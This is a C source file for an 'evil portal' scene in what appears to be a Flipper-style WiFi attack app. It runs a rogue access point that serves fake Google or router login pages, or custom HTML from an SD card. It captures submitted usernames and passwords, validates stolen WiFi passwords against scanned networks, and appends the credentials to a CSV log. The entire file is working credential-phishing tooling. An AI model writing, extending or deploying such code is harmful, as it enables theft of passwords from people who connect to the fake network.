#include "../wifi_app.h"
#include "../wifi_hal.h"
#include "../evil_portal_html.h"
#include "../views/evil_portal_view.h"

#include <storage/storage.h>
#include <furi_hal_rtc.h>
#include <datetime/datetime.h>
#include <stdio.h>
#include <string.h>
#include <esp_wifi.h>

static char* s_sd_html_buf = NULL;
static size_t s_sd_html_len = 0;
static File* s_cred_file = NULL;
static Storage* s_storage = NULL;
static char* s_router_options = NULL;

static void evil_portal_cred_cb(const char* user, const char* pwd, void* ctx) {
    WifiApp* app = ctx;
    if(!app) return;

    uint8_t next = (app->evil_portal_cred_head + 1) % WIFI_APP_EVIL_PORTAL_QUEUE_SIZE;
    if(next == app->evil_portal_cred_tail) {
        return;
    }
    WifiAppEvilPortalCred* slot = &app->evil_portal_cred_queue[app->evil_portal_cred_head];
    strncpy(slot->user, user ? user : "", sizeof(slot->user) - 1);
    slot->user[sizeof(slot->user) - 1] = 0;
    strncpy(slot->pwd, pwd ? pwd : "", sizeof(slot->pwd) - 1);
    slot->pwd[sizeof(slot->pwd) - 1] = 0;
    app->evil_portal_cred_head = next;

    view_dispatcher_send_custom_event(app->view_dispatcher, WifiAppCustomEventEvilPortalCredCaptured);
}

static void evil_portal_valid_cb(const char* ssid, const char* pwd, void* ctx) {
    WifiApp* app = ctx;
    if(!app) return;
    strncpy(app->evil_portal_valid_ssid, ssid ? ssid : "", sizeof(app->evil_portal_valid_ssid) - 1);
    app->evil_portal_valid_ssid[sizeof(app->evil_portal_valid_ssid) - 1] = 0;
    strncpy(app->evil_portal_valid_pwd, pwd ? pwd : "", sizeof(app->evil_portal_valid_pwd) - 1);
    app->evil_portal_valid_pwd[sizeof(app->evil_portal_valid_pwd) - 1] = 0;
    view_dispatcher_send_custom_event(
        app->view_dispatcher, WifiAppCustomEventEvilPortalCredsValid);
}

static void evil_portal_busy_cb(bool busy, const char* msg, void* ctx) {
    WifiApp* app = ctx;
    if(!app) return;
    evil_portal_view_set_busy(app->evil_portal_view_obj, busy, msg);
}

static void evil_portal_action_cb(EvilPortalViewAction action, void* ctx) {
    WifiApp* app = ctx;
    uint32_t event = (action == EvilPortalViewActionConfig)
                         ? WifiAppCustomEventEvilPortalConfig
                         : WifiAppCustomEventEvilPortalTogglePause;
    view_dispatcher_send_custom_event(app->view_dispatcher, event);
}

// Build "<option>SSID</option>" list from a scan, password-protected only.
// Returns malloc'd string or NULL on empty/error. Caller frees.
static char* build_router_ssid_options(void) {
    if(!wifi_hal_is_started()) {
        if(!wifi_hal_start()) return NULL;
    }
    wifi_ap_record_t* raw = NULL;
    uint16_t count = 0;
    wifi_hal_scan(&raw, &count, 32);

    // Estimate buffer size and grow as needed.
    size_t cap = 1024;
    char* buf = malloc(cap);
    if(!buf) {
        if(raw) free(raw);
        return NULL;
    }
    size_t off = 0;
    buf[0] = 0;

    for(uint16_t i = 0; i < count; i++) {
        if(raw[i].authmode == WIFI_AUTH_OPEN) continue;
        const char* ssid = (const char*)raw[i].ssid;
        if(!ssid[0]) continue;

        // Crude HTML escape: replace < > & " with HTML entities while writing.
        char esc[160];
        size_t e = 0;
        for(size_t k = 0; ssid[k] && e + 7 < sizeof(esc); k++) {
            char c = ssid[k];
            if(c == '<') { memcpy(esc + e, "&lt;", 4); e += 4; }
            else if(c == '>') { memcpy(esc + e, "&gt;", 4); e += 4; }
            else if(c == '&') { memcpy(esc + e, "&amp;", 5); e += 5; }
            else if(c == '"') { memcpy(esc + e, "&quot;", 6); e += 6; }
            else if(c == '\'') { memcpy(esc + e, "&#39;", 5); e += 5; }
            else { esc[e++] = c; }
        }
        esc[e] = 0;

        size_t need = off + e * 2 + 32;
        if(need >= cap) {
            cap = need * 2;
            char* nb = realloc(buf, cap);
            if(!nb) { free(buf); if(raw) free(raw); return NULL; }
            buf = nb;
        }
        int n = snprintf(buf + off, cap - off, "<option value=\"%s\">%s</option>", esc, esc);
        if(n > 0) off += (size_t)n;
    }

    if(raw) free(raw);
    if(off == 0) {
        free(buf);
        return NULL;
    }
    return buf;
}

static void sanitize_filename(const char* in, char* out, size_t out_size) {
    size_t j = 0;
    for(size_t i = 0; in[i] && j < out_size - 1; i++) {
        char c = in[i];
        if((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = 0;
}

static bool load_sd_html(const char* path) {
    if(s_sd_html_buf) {
        free(s_sd_html_buf);
        s_sd_html_buf = NULL;
        s_sd_html_len = 0;
    }
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    if(!storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        return false;
    }
    uint64_t size = storage_file_size(f);
    if(size > 16384) size = 16384;
    s_sd_html_buf = malloc((size_t)size + 1);
    if(!s_sd_html_buf) {
        storage_file_close(f);
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        return false;
    }
    uint16_t got = storage_file_read(f, s_sd_html_buf, (uint16_t)size);
    s_sd_html_buf[got] = 0;
    s_sd_html_len = got;
    storage_file_close(f);
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    return s_sd_html_len > 0;
}

static void open_cred_file(WifiApp* app) {
    s_storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(s_storage, "/ext/wifi");
    storage_common_mkdir(s_storage, "/ext/wifi/evil_portal");

    char safe[33];
    sanitize_filename(app->evil_portal_ssid, safe, sizeof(safe));

    char path[160];
    snprintf(path, sizeof(path), "/ext/wifi/evil_portal/%s_creds.csv", safe);

    bool exists = storage_common_stat(s_storage, path, NULL) == FSE_OK;

    s_cred_file = storage_file_alloc(s_storage);
    if(!storage_file_open(s_cred_file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_free(s_cred_file);
        s_cred_file = NULL;
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
        return;
    }
    if(!exists) {
        const char* hdr = "timestamp,user,password\n";
        storage_file_write(s_cred_file, hdr, strlen(hdr));
    }
}

static void close_cred_file(void) {
    if(s_cred_file) {
        storage_file_close(s_cred_file);
        storage_file_free(s_cred_file);
        s_cred_file = NULL;
    }
    if(s_storage) {
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
    }
}

static void drain_cred_queue(WifiApp* app) {
    while(app->evil_portal_cred_tail != app->evil_portal_cred_head) {
        WifiAppEvilPortalCred* c = &app->evil_portal_cred_queue[app->evil_portal_cred_tail];

        if(s_cred_file) {
            DateTime dt;
            furi_hal_rtc_get_datetime(&dt);
            char line[200];
            int n = snprintf(
                line, sizeof(line),
                "%04u-%02u-%02u %02u:%02u:%02u,%s,%s\n",
                dt.year, dt.month, dt.day, dt.hour, dt.minute, dt.second,
                c->user, c->pwd);
            if(n > 0) storage_file_write(s_cred_file, line, n);
        }

        app->evil_portal_cred_total++;
        evil_portal_view_set_creds(app->evil_portal_view_obj, app->evil_portal_cred_total);
        evil_portal_view_set_last(app->evil_portal_view_obj, c->user[0] ? c->user : "(no user)");

        app->evil_portal_cred_tail = (app->evil_portal_cred_tail + 1) % WIFI_APP_EVIL_PORTAL_QUEUE_SIZE;
    }
}

void wifi_app_scene_evil_portal_run_on_enter(void* context) {
    WifiApp* app = context;

    app->evil_portal_cred_head = 0;
    app->evil_portal_cred_tail = 0;
    app->evil_portal_cred_total = 0;

    evil_portal_view_set_ssid(app->evil_portal_view_obj, app->evil_portal_ssid);
    evil_portal_view_set_channel(app->evil_portal_view_obj, app->evil_portal_channel);
    evil_portal_view_set_clients(app->evil_portal_view_obj, 0);
    evil_portal_view_set_creds(app->evil_portal_view_obj, 0);
    evil_portal_view_set_last(app->evil_portal_view_obj, "");
    evil_portal_view_set_status(app->evil_portal_view_obj, "Starting...");

    evil_portal_view_set_action_callback(
        app->evil_portal_view_obj, evil_portal_action_cb, app);
    evil_portal_view_set_paused(app->evil_portal_view_obj, false);

    view_dispatcher_switch_to_view(app->view_dispatcher, WifiAppViewEvilPortal);

    open_cred_file(app);

    const char* html = NULL;
    size_t html_len = 0;
    bool verify = false;
    switch(app->evil_portal_template) {
    case WifiAppEvilPortalTemplateGoogle:
        html = EVIL_PORTAL_HTML_GOOGLE;
        html_len = EVIL_PORTAL_HTML_GOOGLE_LEN;
        break;
    case WifiAppEvilPortalTemplateRouter:
        html = EVIL_PORTAL_HTML_ROUTER;
        html_len = EVIL_PORTAL_HTML_ROUTER_LEN;
        verify = true;
        evil_portal_view_set_busy(app->evil_portal_view_obj, true, "Scanning APs...");
        if(s_router_options) {
            free(s_router_options);
            s_router_options = NULL;
        }
        s_router_options = build_router_ssid_options();
        evil_portal_view_set_busy(app->evil_portal_view_obj, false, NULL);
        break;
    case WifiAppEvilPortalTemplateSd:
        if(load_sd_html(app->evil_portal_sd_path)) {
            html = s_sd_html_buf;
            html_len = s_sd_html_len;
        } else {
            html = EVIL_PORTAL_HTML_GOOGLE;
            html_len = EVIL_PORTAL_HTML_GOOGLE_LEN;
            evil_portal_view_set_status(app->evil_portal_view_obj, "SD failed");
        }
        break;
    }

    WifiHalEvilPortalConfig cfg = {
        .ssid = app->evil_portal_ssid,
        .channel = app->evil_portal_channel,
        .verify_creds = verify,
        .html = html,
        .html_len = html_len,
        .router_ssid_options = s_router_options,
        .cred_cb = evil_portal_cred_cb,
        .cred_cb_ctx = app,
        .valid_cb = evil_portal_valid_cb,
        .valid_cb_ctx = app,
        .busy_cb = evil_portal_busy_cb,
        .busy_cb_ctx = app,
    };

    if(!wifi_hal_evil_portal_start(&cfg)) {
        evil_portal_view_set_status(app->evil_portal_view_obj, "Start failed");
    } else {
        evil_portal_view_set_status(app->evil_portal_view_obj, "Running");
    }
}

bool wifi_app_scene_evil_portal_run_on_event(void* context, SceneManagerEvent event) {
    WifiApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == WifiAppCustomEventEvilPortalStop ||
           event.event == WifiAppCustomEventEvilPortalConfig) {
            scene_manager_previous_scene(app->scene_manager);
            consumed = true;
        } else if(event.event == WifiAppCustomEventEvilPortalTogglePause) {
            if(wifi_hal_evil_portal_is_paused()) {
                wifi_hal_evil_portal_resume();
                evil_portal_view_set_paused(app->evil_portal_view_obj, false);
                evil_portal_view_set_status(app->evil_portal_view_obj, "Running");
            } else {
                wifi_hal_evil_portal_pause();
                evil_portal_view_set_paused(app->evil_portal_view_obj, true);
                evil_portal_view_set_status(app->evil_portal_view_obj, "Paused");
            }
            consumed = true;
        } else if(event.event == WifiAppCustomEventEvilPortalCredCaptured) {
            drain_cred_queue(app);
            consumed = true;
        } else if(event.event == WifiAppCustomEventEvilPortalCredsValid) {
            drain_cred_queue(app);
            scene_manager_next_scene(app->scene_manager, WifiAppSceneEvilPortalCaptured);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        drain_cred_queue(app);
        evil_portal_view_set_clients(
            app->evil_portal_view_obj, wifi_hal_evil_portal_get_client_count());
    }

    return consumed;
}

void wifi_app_scene_evil_portal_run_on_exit(void* context) {
    WifiApp* app = context;
    (void)app;

    evil_portal_view_set_action_callback(app->evil_portal_view_obj, NULL, NULL);
    wifi_hal_evil_portal_stop();
    drain_cred_queue(app);
    close_cred_file();

    if(s_sd_html_buf) {
        free(s_sd_html_buf);
        s_sd_html_buf = NULL;
        s_sd_html_len = 0;
    }
    if(s_router_options) {
        free(s_router_options);
        s_router_options = NULL;
    }
}
